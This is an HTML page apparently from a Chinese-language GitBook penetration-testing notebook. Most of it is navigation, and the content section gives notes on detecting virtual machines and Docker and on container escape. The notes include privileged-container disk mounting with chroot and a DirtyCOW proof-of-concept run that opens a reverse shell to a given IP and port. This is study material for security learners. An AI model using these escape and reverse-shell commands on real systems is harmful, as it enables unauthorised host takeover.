+    
+        <li class="chapter " data-level="1.4.2.2.3" data-path="../../03.代码审计/JAVA/02.基础漏洞/模板注入.html">
+            
+                <a href="../../03.代码审计/JAVA/02.基础漏洞/模板注入.html">
+            
+                    
+                    模板注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.2.4" data-path="../../03.代码审计/JAVA/02.基础漏洞/表达式注入.html">
+            
+                <a href="../../03.代码审计/JAVA/02.基础漏洞/表达式注入.html">
+            
+                    
+                    表达式注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3" >
+            
+                <span>
+            
+                    
+                    03.JavaWeb了解
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.3.1" data-path="../../03.代码审计/JAVA/03.JavaWeb了解/Spring.html">
+            
+                <a href="../../03.代码审计/JAVA/03.JavaWeb了解/Spring.html">
+            
+                    
+                    Spring
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.2" data-path="../../03.代码审计/JAVA/03.JavaWeb了解/Struts2.html">
+            
+                <a href="../../03.代码审计/JAVA/03.JavaWeb了解/Struts2.html">
+            
+                    
+                    Struts 2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.3.3" data-path="../../03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html">
+            
+                <a href="../../03.代码审计/JAVA/03.JavaWeb了解/Tomcat.html">
+            
+                    
+                    Tomcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4" >
+            
+                <span>
+            
+                    
+                    04.反序列化
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.1" >
+            
+                <span>
+            
+                    
+                    CC链
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.2.4.1.1" data-path="../../03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/CC链/CC1--LazyMap.html">
+            
+                    
+                    JAVA反序列化之CC1--LazyMap
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.1.2" data-path="../../03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/CC链/CC1-TransFormed.html">
+            
+                    
+                    Java反序列化之CC1-TransFormed
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.1.3" data-path="../../03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/CC链/URLDNS链.html">
+            
+                    
+                    Java反序列化之URLDNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.2" data-path="../../03.代码审计/JAVA/04.反序列化/FastJson.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/FastJson.html">
+            
+                    
+                    Fastjson漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.4.3" data-path="../../03.代码审计/JAVA/04.反序列化/JNDI.html">
+            
+                <a href="../../03.代码审计/JAVA/04.反序列化/JNDI.html">
+            
+                    
+                    JNDI注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.5" data-path="../../03.代码审计/JAVA/Java-Thymeleaf模板注入.html">
+            
+                <a href="../../03.代码审计/JAVA/Java-Thymeleaf模板注入.html">
+            
+                    
+                    Thymeleaf 模板注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.6" data-path="../../03.代码审计/JAVA/JavaAttack.html">
+            
+                <a href="../../03.代码审计/JAVA/JavaAttack.html">
+            
+                    
+                    Java Attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2.7" data-path="../../03.代码审计/JAVA/Java代审--常见漏洞函数.html">
+            
+                <a href="../../03.代码审计/JAVA/Java代审--常见漏洞函数.html">
+            
+                    
+                    Java代码审计--常见漏洞函数
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" >
+            
+                <span>
+            
+                    
+                    PHP
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.3.1" data-path="../../03.代码审计/PHP/phpinfo.html">
+            
+                <a href="../../03.代码审计/PHP/phpinfo.html">
+            
+                    
+                    phpinfo中的信息
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.2" data-path="../../03.代码审计/PHP/PHP代码审计.html">
+            
+                <a href="../../03.代码审计/PHP/PHP代码审计.html">
+            
+                    
+                    PHP代码审计
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.3" data-path="../../03.代码审计/PHP/php代码审计基础.html">
+            
+                <a href="../../03.代码审计/PHP/php代码审计基础.html">
+            
+                    
+                    PHP代码审计基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3.4" data-path="../../03.代码审计/PHP/php反序列化.html">
+            
+                <a href="../../03.代码审计/PHP/php反序列化.html">
+            
+                    
+                    PHP反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../../03.代码审计/python反序列化.html">
+            
+                <a href="../../03.代码审计/python反序列化.html">
+            
+                    
+                    Python反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" >
+            
+                <span>
+            
+                    
+                    04.工具使用
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../04.工具使用/00.注意.html">
+            
+                <a href="../../04.工具使用/00.注意.html">
+            
+                    
+                    00.注意
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../04.工具使用/01.Cobal%20Strike.md">
+            
+                <span>
+            
+                    
+                    01.Cobal Strike
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../04.工具使用/02.MSF.html">
+            
+                <a href="../../04.工具使用/02.MSF.html">
+            
+                    
+                    02.MSF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.4" data-path="../../04.工具使用/03.抓包工具.html">
+            
+                <a href="../../04.工具使用/03.抓包工具.html">
+            
+                    
+                    03.抓包工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.5" data-path="../../04.工具使用/04.gogo.html">
+            
+                <a href="../../04.工具使用/04.gogo.html">
+            
+                    
+                    04.gogo
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.6" data-path="../../04.工具使用/05.辅助工具.html">
+            
+                <a href="../../04.工具使用/05.辅助工具.html">
+            
+                    
+                    05.辅助工具
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6" >
+            
+                <span>
+            
+                    
+                    05.编程开发
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1" >
+            
+                <span>
+            
+                    
+                    Python
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.1.1" data-path="../../05.编程开发/Python/POC模板.html">
+            
+                <a href="../../05.编程开发/Python/POC模板.html">
+            
+                    
+                    POC编写
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.1.2" data-path="../../05.编程开发/Python/python命名空间.html">
+            
+                <a href="../../05.编程开发/Python/python命名空间.html">
+            
+                    
+                    python命名空间
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.1.3" data-path="../../05.编程开发/Python/python技巧.html">
+            
+                <a href="../../05.编程开发/Python/python技巧.html">
+            
+                    
+                    python技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.2" >
+            
+                <span>
+            
+                    
+                    工具原理
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.6.2.1" data-path="../../05.编程开发/工具原理/sqlmap.html">
+            
+                <a href="../../05.编程开发/工具原理/sqlmap.html">
+            
+                    
+                    Sqlmap
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.6.3" data-path="../../05.编程开发/Nginx.html">
+            
+                <a href="../../05.编程开发/Nginx.html">
+            
+                    
+                    Nginx
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7" >
+            
+                <span>
+            
+                    
+                    06.WriteUp
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1" >
+            
+                <span>
+            
+                    
+                    CTF
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.1.1" data-path="../../06.WriteUp/CTF/2022安洵杯.html">
+            
+                <a href="../../06.WriteUp/CTF/2022安洵杯.html">
+            
+                    
+                    2022 安洵杯
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.2" data-path="../../06.WriteUp/CTF/bugku应急响应.html">
+            
+                <a href="../../06.WriteUp/CTF/bugku应急响应.html">
+            
+                    
+                    bugku 应急响应
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.3" data-path="../../06.WriteUp/CTF/BUU.md">
+            
+                <span>
+            
+                    
+                    BUUCTF刷题合集
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.4" data-path="../../06.WriteUp/CTF/HNCTF.html">
+            
+                <a href="../../06.WriteUp/CTF/HNCTF.html">
+            
+                    
+                    HNCTF 2022
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.5" data-path="../../06.WriteUp/CTF/misc.html">
+            
+                <a href="../../06.WriteUp/CTF/misc.html">
+            
+                    
+                    MISC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.6" data-path="../../06.WriteUp/CTF/NewstarCTF.html">
+            
+                <a href="../../06.WriteUp/CTF/NewstarCTF.html">
+            
+                    
+                    New Star CTF
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.7" data-path="../../06.WriteUp/CTF/NodeJs.html">
+            
+                <a href="../../06.WriteUp/CTF/NodeJs.html">
+            
+                    
+                    NodeJs相关
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.8" data-path="../../06.WriteUp/CTF/NSSRound5.html">
+            
+                <a href="../../06.WriteUp/CTF/NSSRound5.html">
+            
+                    
+                    NSS Round 5
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.9" data-path="../../06.WriteUp/CTF/NSSRound6.html">
+            
+                <a href="../../06.WriteUp/CTF/NSSRound6.html">
+            
+                    
+                    NSS Round 6
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.1.10" data-path="../../06.WriteUp/CTF/环境变量注入.html">
+            
+                <a href="../../06.WriteUp/CTF/环境变量注入.html">
+            
+                    
+                    环境变量注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2" >
+            
+                <span>
+            
+                    
+                    靶机
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.7.2.1" data-path="../../06.WriteUp/靶机/HackTheBox--Alert.html">
+            
+                <a href="../../06.WriteUp/靶机/HackTheBox--Alert.html">
+            
+                    
+                    Hack The Box Alert
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.2" data-path="../../06.WriteUp/靶机/Vulnhub-blue系列.html">
+            
+                <a href="../../06.WriteUp/靶机/Vulnhub-blue系列.html">
+            
+                    
+                    Vulnhub--blue系列
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.3" data-path="../../06.WriteUp/靶机/Vulnhub-DC系列.html">
+            
+                <a href="../../06.WriteUp/靶机/Vulnhub-DC系列.html">
+            
+                    
+                    Vulnhub--DC系列
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.7.2.4" data-path="../../06.WriteUp/靶机/红日靶场1.html">
+            
+                <a href="../../06.WriteUp/靶机/红日靶场1.html">
+            
+                    
+                    红日靶场1
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8" >
+            
+                <span>
+            
+                    
+                    07.基础知识
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1" >
+            
+                <span>
+            
+                    
+                    Linux
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.1.1" data-path="../../07.基础知识/Linux/linux-shell.html">
+            
+                <a href="../../07.基础知识/Linux/linux-shell.html">
+            
+                    
+                    《Linux命令行与shell脚本编程大全》 笔记
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.1.2" data-path="../../07.基础知识/Linux/Linux命令.html">
+            
+                <a href="../../07.基础知识/Linux/Linux命令.html">
+            
+                    
+                    Linux常用命令
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.1.3" data-path="../../07.基础知识/Linux/Linux命令本质.html">
+            
+                <a href="../../07.基础知识/Linux/Linux命令本质.html">
+            
+                    
+                    Linux命令本质
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.2" >
+            
+                <span>
+            
+                    
+                    Windows
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.2.1" data-path="../../07.基础知识/Windows/windows基本操作.html">
+            
+                <a href="../../07.基础知识/Windows/windows基本操作.html">
+            
+                    
+                    windows基本操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3" >
+            
+                <span>
+            
+                    
+                    计算机网络
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.8.3.1" data-path="../../07.基础知识/计算机网络/ARP协议.html">
+            
+                <a href="../../07.基础知识/计算机网络/ARP协议.html">
+            
+                    
+                    ARP协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.2" data-path="../../07.基础知识/计算机网络/DNS协议.html">
+            
+                <a href="../../07.基础知识/计算机网络/DNS协议.html">
+            
+                    
+                    DNS协议
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.3" data-path="../../07.基础知识/计算机网络/湖科大mooc.html">
+            
+                <a href="../../07.基础知识/计算机网络/湖科大mooc.html">
+            
+                    
+                    计算机网络MOOC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.3.4" data-path="../../07.基础知识/计算机网络/虚拟机网络.html">
+            
+                <a href="../../07.基础知识/计算机网络/虚拟机网络.html">
+            
+                    
+                    虚拟机网络
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.4" data-path="../../07.基础知识/tombkeeper关于信息安全学习的分享.html">
+            
+                <a href="../../07.基础知识/tombkeeper关于信息安全学习的分享.html">
+            
+                    
+                    tombkeeper关于信息安全学习的分享
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.5" data-path="../../07.基础知识/名词解释.html">
+            
+                <a href="../../07.基础知识/名词解释.html">
+            
+                    
+                    常见名词与概念
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.6" data-path="../../07.基础知识/渗透测试和红队的区别.html">
+            
+                <a href="../../07.基础知识/渗透测试和红队的区别.html">
+            
+                    
+                    转载--渗透测试和红队的区别
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.8.7" data-path="../../07.基础知识/编码.html">
+            
+                <a href="../../07.基础知识/编码.html">
+            
+                    
+                    编码
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9" >
+            
+                <span>
+            
+                    
+                    08.杂七杂八
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.9.1" data-path="../../08.杂七杂八/个人信息保护.html">
+            
+                <a href="../../08.杂七杂八/个人信息保护.html">
+            
+                    
+                    个人信息保护
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.2" data-path="../../08.杂七杂八/华为安装谷歌.html">
+            
+                <a href="../../08.杂七杂八/华为安装谷歌.html">
+            
+                    
+                    华为安装谷歌
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.3" data-path="../../08.杂七杂八/安全方向.html">
+            
+                <a href="../../08.杂七杂八/安全方向.html">
+            
+                    
+                    安全方向
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.4" data-path="../../08.杂七杂八/手机VPN共享.html">
+            
+                <a href="../../08.杂七杂八/手机VPN共享.html">
+            
+                    
+                    手机VPN共享
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.5" data-path="../../08.杂七杂八/换内存条.html">
+            
+                <a href="../../08.杂七杂八/换内存条.html">
+            
+                    
+                    如何更换内存条
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.9.6" data-path="../../08.杂七杂八/面试记录.html">
+            
+                <a href="../../08.杂七杂八/面试记录.html">
+            
+                    
+                    笔/面记录
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+        </nav>
+        
+        
+    </div>
+
+    <!-- Content nav -->
+    <div class="book-anchor">
+        <div class="book-anchor-title">ON THIS PAGE</div>
+        <div class="book-anchor-body">
+
+        </div>
+    </div>
+
+    <div class="book-body">
+        
+        <div class="body-inner">
+            
+            
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Linux渗透总结</a>
+    </h1>
+</div>
+
+
+
+
+            <div class="page-wrapper" tabindex="-1" role="main">
+                <div class="page-inner">
+                    
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                    <section class="normal markdown-section">
+                        
+                        <h1 id="&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x865A;&#x62DF;&#x673A;">&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;&#x865A;&#x62DF;&#x673A;</h1>
+<pre class="language-"><code class="lang-bash">systemd-detect-virt
+</code></pre>
+<p>&#x8FD4;&#x56DE;None&#x5219;&#x8BF4;&#x660E;&#x662F;&#x7269;&#x7406;&#x673A;</p>
+<pre class="language-"><code class="lang-bash"><span class="token function">whereis</span> vmtoolsd
+</code></pre>
+<h1 id="&#x5BB9;&#x5668;&#x9003;&#x9038;">&#x5BB9;&#x5668;&#x9003;&#x9038;</h1>
+<h2 id="&#x5982;&#x4F55;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;docker&#x5BB9;&#x5668;&#x5185;">&#x5982;&#x4F55;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5728;docker&#x5BB9;&#x5668;&#x5185;</h2>
+<pre class="language-"><code class="lang-bash"><span class="token function">ls</span> <span class="token parameter variable">-al</span> /.dockerenv
+</code></pre>
+<p><img src="../images/image-20230901114550082.png?lastModify=1695029992" alt="image-20230901114550082"></p>
+<pre class="language-"><code class="lang-bash"><span class="token function">cat</span> /proc/1/cgroup
+</code></pre>
+<p><img src="../images/image-20230901114605623.png?lastModify=1695029992" alt="image-20230901114605623"></p>
+<p><img src="../../source/images/image-20241122212549725.png" alt="image-20241122212549725"></p>
+<p>docker&#x5BB9;&#x5668;&#x9003;&#x9038;&#x68C0;&#x6D4B;&#x811A;&#x672C;<a href="https://github.com/teamssix/container-escape-check" target="_blank">teamssix/container-escape-check: docker container escape check || Docker &#x5BB9;&#x5668;&#x9003;&#x9038;&#x68C0;&#x6D4B; (github.com)</a></p>
+<h2 id="&#x5E38;&#x89C1;&#x9003;&#x9038;&#x65B9;&#x6CD5;">&#x5E38;&#x89C1;&#x9003;&#x9038;&#x65B9;&#x6CD5;</h2>
+<p><a href="http://124.220.192.120:7777/CloudNative/Docker/" target="_blank">Docker &#x4ECB;&#x7ECD; | T Wiki</a></p>
+<h3 id="docker-remote-api-&#x672A;&#x6388;&#x6743;&#x9003;&#x9038;">Docker Remote API &#x672A;&#x6388;&#x6743;&#x9003;&#x9038;</h3>
+<p>docker remote api&#x53EF;&#x4EE5;&#x6267;&#x884C;docker&#x547D;&#x4EE4;&#xFF0C;docker&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x76D1;&#x542C;&#x5728;0.0.0.0&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x8C03;&#x7528;API&#x6765;&#x64CD;&#x4F5C;docker&#x3002;</p>
+<p><img src="../images/image-20231023182901150.png" alt="image-20231023182901150"></p>
+<p><img src="../images/image-20231023182819832.png" alt="image-20231023182819832"></p>
+<h3 id="privileged-&#x7279;&#x6743;&#x6A21;&#x5F0F;&#x5BB9;&#x5668;&#x9003;&#x9038;">Privileged &#x7279;&#x6743;&#x6A21;&#x5F0F;&#x5BB9;&#x5668;&#x9003;&#x9038;</h3>
+<pre class="language-"><code class="lang-bash"><span class="token function">sudo</span> <span class="token function">docker</span> run <span class="token parameter variable">-itd</span> <span class="token parameter variable">--privileged</span> ubuntu:latest /bin/bash <span class="token comment"># &#x4F7F;&#x7528;&#x7279;&#x6743;&#x6A21;&#x5F0F;&#x542F;&#x52A8;&#x5BB9;&#x5668;</span>
+<span class="token function">fdisk</span> <span class="token parameter variable">-l</span> <span class="token comment"># &#x67E5;&#x770B;&#x78C1;&#x76D8;&#x6587;&#x4EF6;</span>
+<span class="token function">mkdir</span> /tmp/test <span class="token comment"># &#x521B;&#x5EFA;&#x6302;&#x8F7D;&#x76EE;&#x5F55;</span>
+<span class="token function">mount</span> /dev/sda1 /tmp/test <span class="token comment"># &#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x78C1;&#x76D8;&#x6302;&#x8F7D;&#x5230;&#x6302;&#x8F7D;&#x76EE;&#x5F55;</span>
+<span class="token function">chroot</span> /tmp/test <span class="token comment"># &#x5207;&#x6362;&#x6839;&#x76EE;&#x5F55;</span>
+</code></pre>
+<p><img src="../images/image-20231023183310012.png" alt="image-20231023183310012"></p>
+<p><img src="../images/image-20231023183617812.png" alt="image-20231023183617812"></p>
+<h3 id="&#x654F;&#x611F;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x9003;&#x9038;">&#x654F;&#x611F;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x9003;&#x9038;</h3>
+<pre class="language-"><code class="lang-bash"><span class="token function">df</span> <span class="token comment"># &#x663E;&#x793A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x78C1;&#x76D8;&#x7A7A;&#x95F4;&#x4F7F;&#x7528;&#x60C5;&#x51B5;&#xFF0C;&#x5305;&#x62EC;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x6302;&#x8F7D;&#x70B9;</span>
+</code></pre>
+<p>&#x4EE5;&#x6302;&#x8F7D;&#x4E86;&#x5BBF;&#x4E3B;&#x673A;<code>/root</code>&#x5230;&#x5BB9;&#x5668;<code>/root</code>&#x4E3A;&#x4F8B;</p>
+<p><img src="../images/image-20231023185041650.png" alt="image-20231023185041650"></p>
+<h3 id="&#x5BBF;&#x4E3B;&#x673A;&#x5185;&#x6838;&#x6F0F;&#x6D1E;&#x5BFC;&#x81F4;&#x9003;&#x9038;">&#x5BBF;&#x4E3B;&#x673A;&#x5185;&#x6838;&#x6F0F;&#x6D1E;&#x5BFC;&#x81F4;&#x9003;&#x9038;</h3>
+<p><a href="https://blog.wohin.me/posts/dirtycow-for-escape/" target="_blank">CVE-2016-5195&#x5B9E;&#x9A8C;&#xFF1A;DirtyCoW&#x4E0E;Docker&#x9003;&#x9038; (wohin.me)</a></p>
+<p>Pyaload&#xFF1A;<a href="https://github.com/scumjr/dirtycow-vdso" target="_blank">scumjr/dirtycow-vdso: PoC for Dirty COW (CVE-2016-5195) (github.com)</a></p>
+<pre class="language-"><code class="lang-bash"><span class="token function">make</span>
+./0xdeadbeef <span class="token number">172.18</span>.0.2:10000
+</code></pre>
+<p><strong>&#x7531;&#x4E8E;&#x6700;&#x540E;&#x83B7;&#x5F97;&#x7684;&#x4E8B;&#x5B9E;&#x4E0A;&#x662F;&#x4E00;&#x4E2A;&#x53CD;&#x5F39;shell&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x7ED9;&#x51FA;&#x53CD;&#x5F39;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#x3002;&#x7AEF;&#x53E3;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x8BBE;&#x7F6E;&#xFF0C;IP&#x53EF;&#x4EE5;&#x7528;<code>ifconfig</code>&#x67E5;&#x770B;&#x3002;</strong></p>
+<p><img src="../images/FE062CE3-C428-4889-ABF2-3423CB1D9D28.png" alt="FE062CE3-C428-4889-ABF2-3423CB1D9D28"></p>
+<p><img src="../images/5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412.png" alt="5B633EA1-A558-4DE2-A2D5-6A1ED2DD6412"></p>
+<p><img src="../images/0E89C848-0E3B-4AFD-B035-F8D46CE032F3.png" alt="0E89C848-0E3B-4AFD-B035-F8D46CE032F3"></p>
+<h2 id="&#x96C6;&#x6210;&#x5DE5;&#x5177;">&#x96C6;&#x6210;&#x5DE5;&#x5177;</h2>
+<p><a href="https://github.com/cdk-team/CDK/wiki/CDK-Home-CN" target="_blank">CDK Home CN &#xB7; cdk-team/CDK Wiki (github.com)</a></p>
+<p>CDK&#x5305;&#x62EC;&#x4E09;&#x4E2A;&#x529F;&#x80FD;&#x6A21;&#x5757;</p>
+<ol>
+<li>Evaluate: &#x5BB9;&#x5668;&#x5185;&#x90E8;&#x4FE1;&#x606F;&#x6536;&#x96C6;&#xFF0C;&#x4EE5;&#x53D1;&#x73B0;&#x6F5C;&#x5728;&#x7684;&#x5F31;&#x70B9;&#x4FBF;&#x4E8E;&#x540E;&#x7EED;&#x5229;&#x7528;&#x3002;</li>
+<li>Exploit: &#x63D0;&#x4F9B;&#x5BB9;&#x5668;&#x9003;&#x9038;&#x3001;&#x6301;&#x4E45;&#x5316;&#x3001;&#x6A2A;&#x5411;&#x79FB;&#x52A8;&#x7B49;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x3002;</li>
+<li>Tool: &#x4FEE;&#x590D;&#x6E17;&#x900F;&#x8FC7;&#x7A0B;&#x4E2D;&#x5E38;&#x7528;&#x7684;linux&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x4E0E;Docker/K8s API&#x4EA4;&#x4E92;&#x7684;&#x547D;&#x4EE4;&#x3002;</li>
+</ol>
+<h2 id="&#x8865;&#x5145;">&#x8865;&#x5145;</h2>
+<p><a href="https://github.com/teamssix/awesome-cloud-security" target="_blank">teamssix/awesome-cloud-security: awesome cloud security &#x6536;&#x96C6;&#x4E00;&#x4E9B;&#x56FD;&#x5185;&#x5916;&#x4E0D;&#x9519;&#x7684;&#x4E91;&#x5B89;&#x5168;&#x8D44;&#x6E90;&#xFF0C;&#x8BE5;&#x9879;&#x76EE;&#x4E3B;&#x8981;&#x9762;&#x5411;&#x56FD;&#x5185;&#x7684;&#x5B89;&#x5168;&#x4EBA;&#x5458; (github.com)</a><a href="https://github.com/source-xu/docker-vuls" target="_blank">https://github.com/source-xu/docker-vuls</a>)</p>
+<p><a href="https://www.freebuf.com/articles/es/377292.html" target="_blank">&#x4E00;&#x4E2A;&#x672A;&#x516C;&#x5F00;&#x7684;&#x5BB9;&#x5668;&#x9003;&#x9038;&#x65B9;&#x5F0F; - FreeBuf&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x884C;&#x4E1A;&#x95E8;&#x6237;</a></p>
+<h1 id="linux&#x63D0;&#x6743;">Linux&#x63D0;&#x6743;</h1>
+<p><a href="https://mp.weixin.qq.com/s/tl1Qf1RukOBOcjp4PMXn_w" target="_blank">https://mp.weixin.qq.com/s/tl1Qf1RukOBOcjp4PMXn_w</a></p>
